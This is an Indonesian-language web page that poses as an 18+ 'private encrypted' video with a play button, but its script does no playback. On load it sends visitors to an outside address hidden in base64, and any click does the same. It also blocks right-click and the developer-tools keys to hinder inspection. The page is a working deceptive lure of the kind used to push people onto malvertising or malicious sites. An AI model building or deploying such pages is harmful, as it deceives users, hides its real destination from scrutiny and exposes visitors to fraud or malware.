<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
    <meta name="referrer" content="no-referrer">
    <title>Ｍｏｇｏｆｌｏｘ - Akses Privat</title>

    <!-- Metadata Sosial -->
    <meta property="og:title" content="Akses Privat">
    <meta property="og:description" content="Pengiriman media aman siap putar.">
    <meta property="og:image" content="https://vidley.pw/tombolplay.jpg">
    <meta property="og:type" content="website">
    
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');

        :root {
            --brand-red: #e50914;
        }

        body {
            background-color: #000;
            color: #fff;
            font-family: 'Inter', sans-serif;
            overflow: hidden;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .main-container {
            width: 100%;
            max-width: 450px;
            height: 100vh;
            background: #000;
            position: relative;
            cursor: pointer;
        }

        .content-overlay {
            position: absolute;
            inset: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 2rem;
            text-align: center;
        }

        .play-button {
            width: 100px;
            height: 100px;
            background: var(--brand-red);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 30px rgba(229, 9, 20, 0.4);
        }

        .play-icon {
            width: 0;
            height: 0;
            border-top: 15px solid transparent;
            border-bottom: 15px solid transparent;
            border-left: 25px solid white;
            margin-left: 8px;
        }
    </style>
</head>
<body>

    <div class="main-container" id="hitArea">
        <div class="content-overlay">
            <div class="border border-red-600 text-red-600 px-2 py-1 text-xs font-black rounded mb-4">18+</div>
            <h2 class="text-xs tracking-[0.3em] font-bold opacity-70 mb-8">KONTEN TERENKRIPSI PRIVAT</h2>
            
            <div class="play-button mb-6">
                <div class="play-icon"></div>
            </div>

            <p class="text-sm font-bold tracking-widest uppercase">Klik untuk Membuka</p>
        </div>
    </div>

    <script>
        // Base redirect yang disamarkan
        const BASE_REDIRECT = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg1MjM3OA==");

        /**
         * Mengambil ID video dari parameter URL atau path
         */
        function extractVideoId() {
            const params = new URLSearchParams(window.location.search);
            let id = params.get("id") || params.get("v");

            if (!id) {
                const pathParts = window.location.pathname.split("/");
                const lastPart = pathParts.pop().trim();
                if (lastPart && !lastPart.includes(".") && lastPart !== "index") {
                    id = lastPart;
                }
            }
            return (id && id.length >= 3) ? id : null;
        }

        /**
         * Fungsi untuk langsung pindah ke tautan tujuan
         */
        function goDirectly() {
            const id = extractVideoId();
            let finalUrl = BASE_REDIRECT;
            if (id) finalUrl += "/" + id;
            
            window.location.replace(finalUrl);
        }

        // Eksekusi segera setelah DOM siap
        document.addEventListener("DOMContentLoaded", () => {
            // Langsung coba pindah saat halaman dimuat
            goDirectly();

            // Backup jika auto-redirect gagal/terblokir, klik area mana saja akan memicu perpindahan
            document.getElementById("hitArea").addEventListener("click", goDirectly);
        });

        // Pencegahan inspeksi standar
        document.addEventListener("contextmenu", e => e.preventDefault());
        document.onkeydown = e => {
            if (e.keyCode === 123) return false;
            if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) return false;
        };
    </script>

</body>
</html>
